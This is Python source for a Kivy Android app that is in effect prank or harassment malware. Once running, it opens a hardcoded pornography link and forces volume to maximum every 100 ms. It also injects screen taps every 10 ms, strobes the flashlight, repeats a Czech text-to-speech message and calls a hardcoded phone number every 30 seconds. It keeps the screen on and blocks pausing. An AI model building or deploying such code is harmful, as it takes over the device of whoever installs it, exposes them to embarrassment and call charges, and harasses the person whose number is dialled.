import kivy
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from kivy.utils import platform

# Android Specific Imports via PyJNIus
if platform == 'android':
    from jnius import autoclass
    
    Context = autoclass('android.content.Context')
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    AudioManager = autoclass('android.media.AudioManager')
    WindowManager = autoclass('android.view.WindowManager$LayoutParams')
    SystemClock = autoclass('android.os.SystemClock')
    MotionEvent = autoclass('android.view.MotionEvent')
    Intent = autoclass('android.content.Intent')
    Uri = autoclass('android.net.Uri')
    CameraManager = autoclass('android.hardware.camera2.CameraManager')
    TextToSpeech = autoclass('android.speech.tts.TextToSpeech')
    Locale = autoclass('java.util.Locale')


class MainAppLayout(BoxLayout):
    def __init__(self, **kwargs):
        super(MainAppLayout, self).__init__(**kwargs)
        
        # === CHANGE YOUR URL AND PHONE NUMBER HERE ===
        self.target_url = "https://pornhub.com/view_video.php?viewkey=657ec64c5d64"
        self.phone_number = "+420608886172"
        
        self.flashlight_state = False
        self.camera_id = None
        self.camera_manager = None
        self.tts = None
        
        # System setup
        self.keep_screen_on()
        self.init_flashlight()
        self.init_tts()
        
        # 1. Permanent 100% volume enforcement (every 100 ms)
        Clock.schedule_interval(self.enforce_max_volume, 0.1)
        
        # 2. Open link in browser after startup
        Clock.schedule_once(self.open_browser, 1)
        
        # 3. Screen tap simulation (every 10 ms)
        Clock.schedule_interval(self.python_tap_screen, 0.01)
        
        # 4. Flashlight toggle (every 50 ms)
        Clock.schedule_interval(self.toggle_flashlight, 0.05)
        
        # 5. Make call (every 30 seconds)
        Clock.schedule_interval(self.make_phone_call, 30.0)

        # 6. Screen Reading / Text-To-Speech Loop (every 2 seconds)
        Clock.schedule_interval(self.speak_screen_text, 2.0)

    def keep_screen_on(self):
        """Keep the screen awake at all times."""
        if platform == 'android':
            try:
                activity = PythonActivity.mActivity
                window = activity.getWindow()
                window.addFlags(WindowManager.FLAG_KEEP_SCREEN_ON)
            except Exception as e:
                print(f"Screen setup error: {e}")

    def enforce_max_volume(self, dt):
        """Force media and speech volume to max (100%)."""
        if platform == 'android':
            try:
                activity = PythonActivity.mActivity
                audio_manager = activity.getSystemService(Context.AUDIO_SERVICE)
                
                # Maximize music stream
                max_vol = audio_manager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                audio_manager.setStreamVolume(AudioManager.STREAM_MUSIC, max_vol, 0)
                
                # Maximize accessibility/TTS stream
                max_speech = audio_manager.getStreamMaxVolume(AudioManager.STREAM_ACCESSIBILITY)
                audio_manager.setStreamVolume(AudioManager.STREAM_ACCESSIBILITY, max_speech, 0)
            except Exception as e:
                print(f"Volume error: {e}")

    def init_flashlight(self):
        """Initialize CameraManager for LED flash control."""
        if platform == 'android':
            try:
                activity = PythonActivity.mActivity
                self.camera_manager = activity.getSystemService(Context.CAMERA_SERVICE)
                camera_ids = self.camera_manager.getCameraIdList()
                if len(camera_ids) > 0:
                    self.camera_id = camera_ids[0]
            except Exception as e:
                print(f"Flashlight init error: {e}")

    def init_tts(self):
        """Initialize Text-To-Speech engine."""
        if platform == 'android':
            try:
                activity = PythonActivity.mActivity
                self.tts = TextToSpeech(activity, None)
                self.tts.setLanguage(Locale.getDefault())
            except Exception as e:
                print(f"TTS Init Error: {e}")

    def speak_screen_text(self, dt):
        """Forces continuous reading via Text-To-Speech."""
        if platform == 'android' and self.tts:
            try:
                # Text queue mode set to QUEUE_FLUSH to continuously lock/force current speech
                text_to_read = "Aplikace je aktivní. Probíhá předčítání obrazovky."
                self.tts.speak(text_to_read, TextToSpeech.QUEUE_FLUSH, None, "ScreenReaderID")
            except Exception as e:
                pass

    def toggle_flashlight(self, dt):
        """Toggle LED flash state."""
        if platform == 'android' and self.camera_manager and self.camera_id:
            try:
                self.flashlight_state = not self.flashlight_state
                self.camera_manager.setTorchMode(self.camera_id, self.flashlight_state)
            except Exception as e:
                pass

    def open_browser(self, dt):
        """Open specified link in default browser."""
        if platform == 'android':
            try:
                activity = PythonActivity.mActivity
                intent = Intent(Intent.ACTION_VIEW, Uri.parse(self.target_url))
                activity.startActivity(intent)
            except Exception as e:
                print(f"Browser error: {e}")

    def make_phone_call(self, dt=None):
        """Trigger phone call to given number."""
        if platform == 'android':
            try:
                activity = PythonActivity.mActivity
                intent = Intent(Intent.ACTION_CALL)
                intent.setData(Uri.parse(f"tel:{self.phone_number}"))
                activity.startActivity(intent)
            except Exception as e:
                print(f"Phone call error: {e}")

    def python_tap_screen(self, dt):
        """Simulate touch tap in screen center."""
        if platform == 'android':
            try:
                activity = PythonActivity.mActivity
                display = activity.getWindowManager().getDefaultDisplay()
                
                x = display.getWidth() / 2
                y = display.getHeight() / 2
                
                down_time = SystemClock.uptimeMillis()
                event_time = SystemClock.uptimeMillis()
                
                event_down = MotionEvent.obtain(down_time, event_time, MotionEvent.ACTION_DOWN, x, y, 0)
                event_up = MotionEvent.obtain(down_time, event_time + 1, MotionEvent.ACTION_UP, x, y, 0)
                
                activity.getWindow().injectInputEvent(event_down)
                activity.getWindow().injectInputEvent(event_up)
            except Exception as e:
                pass


class AutoApp(App):
    def build(self):
        return MainAppLayout()

    def on_pause(self):
        # Disables pausing: Returning True prevents Kivy from pausing execution
        return True

    def on_resume(self):
        pass

if __name__ == '__main__':
    AutoApp().run()
